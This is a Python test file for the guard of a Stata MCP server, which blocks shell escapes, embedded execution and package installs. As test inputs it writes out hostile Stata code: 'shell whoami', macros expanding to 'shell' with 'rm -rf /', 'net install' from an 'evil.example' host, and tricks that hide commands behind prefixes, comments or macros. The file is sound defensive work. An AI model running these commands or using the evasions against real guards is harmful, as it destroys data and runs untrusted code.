"""Tests for guard blacklist and validator protections."""

from __future__ import annotations

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "src"))

from stata_mcp.guard.blacklist import DANGEROUS_COMMANDS, PACKAGE_MANAGEMENT_COMMANDS
from stata_mcp.guard.validator import GuardValidator, PackageManagementGuardValidator


def test_dangerous_command_abbreviations_are_blacklisted() -> None:
    expected = {"sh", "xsh", "winex", "unixc", "era", "rmd"}
    assert expected.issubset(DANGEROUS_COMMANDS)


def test_embedded_execution_commands_are_blacklisted() -> None:
    expected = {"python", "mata", "java", "plugin"}
    assert expected.issubset(DANGEROUS_COMMANDS)


def test_package_management_command_families_are_protected() -> None:
    expected = {"ssc", "net", "github", "adoupdate", "update"}
    assert expected.issubset(PACKAGE_MANAGEMENT_COMMANDS)


def test_package_management_guard_rejects_direct_prefixed_and_macro_commands() -> None:
    code = """
ssc install reghdfe
quietly: net install custompkg, from(https://evil.example/stata)
version 18: net install custompkg, from(https://evil.example/stata)
github install attacker/repo
adoupdate, update all
update all
local pkgcmd "ssc"
`pkgcmd' install estout
"""

    report = PackageManagementGuardValidator().validate(code)

    assert report.is_safe is False
    blocked_commands = {
        item.content
        for item in report.dangerous_items
        if item.type == "command"
    }
    assert {"ssc", "net", "github", "adoupdate", "update"}.issubset(
        blocked_commands
    )
    assert any(item.type == "macro" and item.content == "`pkgcmd'" for item in report.dangerous_items)


def test_package_management_guard_rejects_dynamic_command_position_macro() -> None:
    report = PackageManagementGuardValidator().validate(
        'local prefix "n" + "et"\n`prefix\' install custompkg'
    )

    assert report.is_safe is False
    assert any(item.type == "pattern" for item in report.dangerous_items)


def test_package_management_guard_allows_normal_analysis_commands() -> None:
    report = PackageManagementGuardValidator().validate("sysuse auto\nregress price mpg")

    assert report.is_safe is True


def test_colon_prefix_is_stripped_before_command_check() -> None:
    report = GuardValidator().validate("quietly: shell echo pwn")
    assert report.is_safe is False
    assert any(item.type == "command" and item.content == "shell" for item in report.dangerous_items)


def test_chained_colon_prefix_is_stripped_before_command_check() -> None:
    report = GuardValidator().validate("capture noisily: shell echo pwn")
    assert report.is_safe is False
    assert any(item.type == "command" and item.content == "shell" for item in report.dangerous_items)


def test_delimit_semicolon_is_rejected() -> None:
    report = GuardValidator().validate("#delimit ;\ndisplay 1")
    assert report.is_safe is False
    assert any(item.content == "#delimit ;" for item in report.dangerous_items)


def test_macro_expansion_with_dangerous_local_is_flagged() -> None:
    code = 'local cmd "shell"\n`cmd\' "rm -rf /"'  # noqa: S608
    report = GuardValidator().validate(code)
    assert report.is_safe is False
    assert any(item.type == "macro" and item.content == "`cmd'" for item in report.dangerous_items)


def test_unquoted_dangerous_local_is_flagged() -> None:
    code = "local cmd shell\ndisplay `cmd'"
    report = GuardValidator().validate(code)
    assert report.is_safe is False
    assert any(item.type == "macro" and item.content == "`cmd'" for item in report.dangerous_items)


def test_compound_quoted_dangerous_local_is_flagged() -> None:
    code = "local cmd `\"shell\"'\ndisplay `cmd'"
    report = GuardValidator().validate(code)
    assert report.is_safe is False
    assert any(item.type == "macro" and item.content == "`cmd'" for item in report.dangerous_items)


def test_global_macro_expansion_with_dangerous_value_is_flagged() -> None:
    code = 'global cmd "shell"\ndisplay $cmd'
    report = GuardValidator().validate(code)
    assert report.is_safe is False
    assert any(item.type == "macro" and item.content == "$cmd" for item in report.dangerous_items)


def test_macro_expansion_is_checked_across_entire_line() -> None:
    code = 'local cmd "shell"\ndisplay `cmd\''
    report = GuardValidator().validate(code)
    assert report.is_safe is False
    assert any(item.type == "macro" and item.content == "`cmd'" for item in report.dangerous_items)


def test_macro_expansion_with_safe_local_is_not_flagged() -> None:
    code = 'local cmd "regress"\n`cmd\' y x'
    report = GuardValidator().validate(code)
    assert report.is_safe is True


def test_commented_local_definition_is_ignored() -> None:
    code = '* local cmd "shell"\n`cmd\' "rm -rf /"'  # noqa: S608
    report = GuardValidator().validate(code)
    assert report.is_safe is True


def test_macro_expansion_does_not_match_substring_macro_name() -> None:
    code = 'local cmd "shell"\n`cmdline\' "rm -rf /"'  # noqa: S608
    report = GuardValidator().validate(code)
    assert report.is_safe is True


def test_prefixed_local_definition_is_detected() -> None:
    code = 'qui local cmd "shell"\n`cmd\' "rm"'  # noqa: S608
    report = GuardValidator().validate(code)
    assert report.is_safe is False
    assert any(item.type == "macro" and item.content == "`cmd'" for item in report.dangerous_items)


def test_chained_colon_prefix_with_each_prefix_having_colon() -> None:
    report = GuardValidator().validate("capture: noisily: shell echo pwn")
    assert report.is_safe is False
    assert any(item.type == "command" and item.content == "shell" for item in report.dangerous_items)


def test_colon_prefix_with_space_before_colon() -> None:
    report = GuardValidator().validate("quietly : shell echo pwn")
    assert report.is_safe is False
    assert any(item.type == "command" and item.content == "shell" for item in report.dangerous_items)


def test_macro_with_argument_in_value_is_flagged() -> None:
    code = "local cmd shell echo pwn\n`cmd'"
    report = GuardValidator().validate(code)
    assert report.is_safe is False
    assert any(item.type == "macro" and item.content == "`cmd'" for item in report.dangerous_items)


def test_global_macro_with_argument_in_value_is_flagged() -> None:
    code = "global cmd shell echo pwn\n$cmd"
    report = GuardValidator().validate(code)
    assert report.is_safe is False
    assert any(item.type == "macro" and item.content == "$cmd" for item in report.dangerous_items)


def test_global_macro_with_braces_is_flagged() -> None:
    code = 'global cmd "shell"\n${cmd}'
    report = GuardValidator().validate(code)
    assert report.is_safe is False
    assert any(item.type == "macro" and item.content == "$cmd" for item in report.dangerous_items)


def test_inline_block_comment_does_not_hide_dangerous_command() -> None:
    report = GuardValidator().validate("/* */ shell whoami")

    assert report.is_safe is False
    assert any(item.type == "command" and item.content == "shell" for item in report.dangerous_items)


def test_multiline_block_comment_does_not_hide_dangerous_command() -> None:
    report = GuardValidator().validate("/* ignored\nignored */ !whoami")

    assert report.is_safe is False
    assert any(item.type == "command" and item.content == "!" for item in report.dangerous_items)


def test_frame_prefix_is_stripped_before_command_check() -> None:
    report = GuardValidator().validate("frame default: shell whoami")

    assert report.is_safe is False
    assert any(item.type == "command" and item.content == "shell" for item in report.dangerous_items)
